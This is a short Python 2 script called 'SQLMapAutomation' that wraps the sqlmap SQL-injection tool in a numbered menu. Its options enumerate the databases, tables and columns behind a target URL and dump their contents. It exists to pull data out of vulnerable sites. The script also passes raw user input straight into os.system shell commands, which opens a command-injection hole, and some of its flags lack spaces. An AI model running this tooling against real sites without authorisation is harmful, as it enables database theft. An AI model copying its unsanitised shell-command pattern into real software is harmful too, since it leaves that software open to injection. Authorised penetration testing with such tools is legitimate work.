#! /bin/env python
import os

os.system("clear") #clear screen
os.system("figlet 'SQLMapAutomation' ")
print("""

\t\t\t\t\t By LexiLominite
    1. Database
    2. Tables
    3. Column
    4. Column Dump
    5. Dump
    6. exit
    """)

url = raw_input("Enter a sql_url: ") # for sql url
def database():
    os.system("sqlmap "+ "-u "+url+" --dbs") # for show database's
def tables():
    d_name = raw_input("Enter a database name: ")
    os.system("sqlmap "+ "-u "+url+" -D "+ d_name +" --tables")
def col():
    d_name = raw_input("Enter a database name: ")
    t_name = raw_input("Enter a tables name: ")
    os.system("sqlmap "+ "-u "+url+" -D "+ d_name +" -T"+ t_name +" --column")
def col_dump():
    d_name = raw_input("Enter a database name: ")
    t_name = raw_input("Enter a tables name: ")
    c_name = raw_input("Enter a column name: ")
    os.system("sqlmap "+ "-u "+url+" -D "+ d_name +" -T"+ t_name +" -C"+ c_name +" --dump")
def a_dump():
    os.system("sqlmap "+ "-u "+url+" --dump")


def main():
    choose = int(input("Enter a number: "))
    if choose == 1:
        database()
    elif choose == 2:
        tables()
    elif choose == 3:
        col()
    elif choose == 4:
        col_dump()
    elif choose == 5:
        a_dump()
    elif choose == 6:
        os.system("clear")
        print("Thank you for using!")
        os.system("exit")
    else:
        print("wrong!!")

main()
